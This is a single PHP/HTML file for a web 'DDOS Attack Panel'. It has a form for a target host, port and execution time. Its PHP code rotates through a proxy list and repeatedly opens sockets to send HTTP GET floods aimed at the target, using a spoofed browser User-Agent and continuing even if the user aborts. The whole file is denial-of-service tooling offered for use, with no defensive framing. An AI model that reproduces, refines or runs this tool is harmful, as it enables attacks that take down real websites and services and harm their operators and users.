<html>
  <head>
    <title>Marian Attack Panel</title>
    <style>
      body {
        background-color: black;
        color: white;
        font-family: Arial, sans-serif;
      }
      label {
  display: inline-block;
  width: 100px;
  font-size: 1.2rem;
  margin-right: 10px;
}
input[type="text"] {
  display: inline-block;
  width: 300px;
  padding: 8px;
  border: none;
  border-radius: 5px;
  margin-bottom: 10px;
  font-size: 1.2rem;
}

      input[type="submit"] {
  background-color: red;
  color: white;
  padding: 10px;
  border: none;
  border-radius: 5px;
  font-size: 1.2rem;
  cursor: pointer;
  margin-left: 337px;
}
    </style>
  </head>
  <body>
    <h1 style="text-align:center">DDOS Attack Panel</h1>
    <form method="post" action="ddos.php" style="width: 500px; margin: 0 auto;">
      <label for="host">Host:</label>
      <input type="text" id="host" name="host"><br><br>
      <label for="port">Port:</label>
      <input type="text" id="port" name="port"><br><br>
      <label for="exectime">Execution Time:</label>
      <input type="text" id="exectime" name="exectime"><br><br>
      <input type="submit" value="Attack!">
    </form>
  </body>
</html>

<?php
  if(isset($_POST["host"]) && isset($_POST["port"]) && isset($_POST["exectime"])) {
    $host = $_POST["host"];
    $port = $_POST["port"];
    $exectime = $_POST["exectime"];
  
    $headers = array(
      'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
    );
  
    ignore_user_abort(TRUE);
    $attack = 0;

    $proxy_list = file('proxies.txt');
  
    for($i=0; $i<$exectime; $i++){
      $out = "";
      $out .= "GET / HTTP/1.1\r\n";
      $out .= "Host: $host\r\n";
      $out .= implode("\r\n", $headers)."\r\n";
      $out .= "Connection: Close\r\n\r\n";
    
      $proxy = trim($proxy_list[array_rand($proxy_list)]);
      $proxy_parts = explode(':', $proxy);
      $proxy_host = $proxy_parts[0];
      $proxy_port = $proxy_parts[1];
    
      $socket = fsockopen($proxy_host, $proxy_port, $errno, $errstr, 30);

      $attack += 1;
      echo "attack". $attack;

      if (!$socket) {
        echo "Unable to connect to proxy";
        die();
      } else {
        fwrite($socket, $out);
        fclose($socket);
      }
    }
  }
?>
